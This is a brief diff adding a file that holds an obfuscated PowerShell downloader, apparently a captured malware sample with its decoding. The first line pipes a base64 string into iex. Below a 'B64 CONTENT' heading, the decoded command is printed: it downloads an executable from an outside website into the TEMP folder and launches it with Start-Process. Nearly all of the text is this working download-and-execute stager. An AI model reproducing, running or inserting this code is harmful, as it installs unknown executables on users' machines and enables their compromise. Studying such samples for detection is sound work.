@@ -1,0 +1,7 @@
+iex([SYsTem.TEXt.eNCOdINg]::uTF8.gETsTRInG([SYstEm.CoNVerT]::fROMBaSe64strINg('CihOZXctT2JqZWN0IFN5c3RFTS5ORVQuV2ViY0xJRU50KS5Eb1dOTG9BZEZJbEUoJ2h0dHA6Ly9ib2lzZWRlbGFyaXZpZXJlLmNvbS9iYWNrdXAvY3NzL25ld2NvbmZpZy5leGUnLCIkRU52OlRFTVBcbmVvbmU2LmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkRU52OlRFTVBcbmVvbmU2LmV4ZSIpCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SystEM.NET.WebcLIENt).DoWNLoAdFIlE('http://boisedelariviere.com/backup/css/newconfig.exe',"$ENv:TEMP\neone6.exe");Start-Process ("$ENv:TEMP\neone6.exe")
+
